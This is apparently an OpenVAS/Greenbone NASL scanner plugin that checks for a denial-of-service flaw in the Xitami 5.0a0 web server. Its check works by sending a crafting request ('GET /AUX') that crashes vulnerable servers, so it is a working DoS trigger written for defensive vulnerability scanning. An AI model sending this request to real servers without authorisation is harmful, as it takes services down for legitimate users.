# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100633");
  script_version("2023-10-27T16:11:32+0000");
  script_tag(name:"last_modification", value:"2023-10-27 16:11:32 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-05-11 20:07:01 +0200 (Tue, 11 May 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Xitami '/AUX' Request Remote Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40027");
  script_xref(name:"URL", value:"http://www.imatix.com/products");

  script_tag(name:"summary", value:"Xitami is prone to a denial of service (DoS) vulnerability.");
  script_tag(name:"impact", value:"Attackers can exploit this issue to crash the affected application,
  denying service to legitimate users.");
  script_tag(name:"affected", value:"Xitami 5.0a0 is vulnerable.");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

if( http_is_dead( port:port, retry:4 ) ) exit( 0 );

req = string("GET /AUX HTTP/1.0\r\n\r\n" );
http_send_recv( port:port, data:req );

sleep( 2 );

if( http_is_dead( port:port, retry:4 ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
